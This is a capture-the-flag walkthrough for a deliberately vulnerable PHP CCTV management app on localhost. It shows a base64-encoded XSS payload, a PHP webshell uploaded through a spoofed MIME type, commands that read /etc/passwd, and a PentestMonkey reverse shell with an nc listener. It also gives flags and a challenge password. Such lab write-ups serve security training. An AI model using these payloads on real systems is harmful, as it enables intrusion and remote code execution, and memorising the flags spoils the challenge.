# Irongate CTF — Part 2b Walkthrough: XSS & Reverse Shell

**App:** ROCKGATE Correctional CCTV Management System  
**Stack:** PHP + MySQL  
**Target:** `http://localhost:8080`  
**Prerequisite:** Admin session from Part 2a

---

## Challenge Overview

| Part | Challenge | Flag |
|------|-----------|------|
| 2b | Base64 XSS — get upload key | `7bc8459cca316181a7592e7600e04c53` |
| 2b | File upload bypass → RCE | `PrisonCTF{y0u_g0t_r3m0t3_c0d3_3x3cut10n}` |

---

## Step 6 — XSS: Base64 Encoding to Get the Upload Key

### Solution

The **Operator Broadcast Terminal** decodes base64 input and renders it as raw HTML — allowing XSS.

> **Clue in the terminal:** `ALERT! THIS BOX CONTAIN THE "(key)"`

Base64 encode your payload and paste it into the terminal, then click **TRANSMIT**.

```bash
echo -n '<script>alert(key)</script>' | base64
```

**Payload:**
```
PHNjcmlwdD5hbGVydChrZXkpPC9zY3JpcHQ+
```

An `alert()` pops with the upload key:
```
7bc8459cca316181a7592e7600e04c53
```

---

## Step 7 — File Upload Bypass → RCE

### Unlock the uploader

Enter `7bc8459cca316181a7592e7600e04c53` into the **FIRMWARE PACKAGE UPLOADER** key field and click **UNLOCK**.

### Vulnerability

`upload.php` only checks the **client-supplied MIME type** — no magic byte check, no extension filter:

```php
$allowedMime = ['image/jpeg', 'image/png', 'application/x-php', 'application/octet-stream'];
if (!in_array($file['type'], $allowedMime, true)) {
    // blocked
}
```

`$file['type']` is set by the browser/client — fully attacker-controlled.  
Files are saved with their **original filename** directly to `/uploads/`.

> **Clue in the upload box:** `BYPASSING IS THE WAY !`

### Create a webshell

```php
<?php system($_GET['cmd']); ?>
```

Save as `shell.php`.

### Upload with spoofed MIME type

**Option A — Burp Suite Community**

1. Turn on the Burp proxy and upload any valid JPEG through the **FIRMWARE PACKAGE UPLOADER** in the browser.
2. Intercept the request in **Proxy → Intercept**.
3. In the raw request, change the filename from `image.jpg` to `shell.php` and replace the file body with the webshell code above.
4. The `Content-Type` can be `image/jpeg`, `application/x-php`, or `application/octet-stream`.
5. Forward the request.

**Option B — curl**

First grab your session cookie from the browser (DevTools → Application → Cookies → `PHPSESSID`), then:

```bash
curl -s \
  -b "PHPSESSID=<your_session_cookie>" \
  -F "firmware=@shell.php;type=image/jpeg" \
  http://localhost:8080/upload.php
```

Response:
```json
{
  "success": true,
  "filename": "shell.php",
  "url": "/uploads/shell.php"
}
```

### Execute commands

```bash
# Check who we are
curl "http://localhost:8080/uploads/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Read system users
curl "http://localhost:8080/uploads/shell.php?cmd=cat+/etc/passwd"

# List web root
curl "http://localhost:8080/uploads/shell.php?cmd=ls+-la+/var/www/irongate"
```

### Get a full reverse shell (PentestMonkey)

**Step 1 — Download the shell:**
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O revshell.php
```

**Step 2 — Edit the IP and port** inside `revshell.php`:
```php
$ip = '127.0.0.1';   // Your attacker IP
$port = 4444;
```

**Step 3 — Start a listener:**
```bash
nc -lvnp 4444
```

**Step 4 — Upload via Burp or curl (same method as above).**

**Step 5 — Trigger the shell:**
```bash
curl "http://localhost:8080/uploads/revshell.php"
```

You now have an interactive shell as `www-data`. Grab the flag:
```bash
cat /var/www/shell_flag.txt
```

**FLAG 2b:** `PrisonCTF{y0u_g0t_r3m0t3_c0d3_3x3cut10n}`

The flag file also contains a password for the next challenge:
```
You will need this password : "u9getit_Br0"
```

---

## Attack Summary

```
1. XSS — BASE64 ENCODING
   payload: PHNjcmlwdD5hbGVydChrZXkpPC9zY3JpcHQ+
   → decodes to: <script>alert(key)</script>
   → reveals upload key: 7bc8459cca316181a7592e7600e04c53

2. FILE UPLOAD — MIME BYPASS
   Upload revshell.php via Burp Suite or curl with spoofed MIME type
   → trigger: curl http://localhost:8080/uploads/revshell.php
   → cat /var/www/shell_flag.txt
   → FLAG 2b: PrisonCTF{y0u_g0t_r3m0t3_c0d3_3x3cut10n}
   → Password for next challenge: u9getit_Br0
```
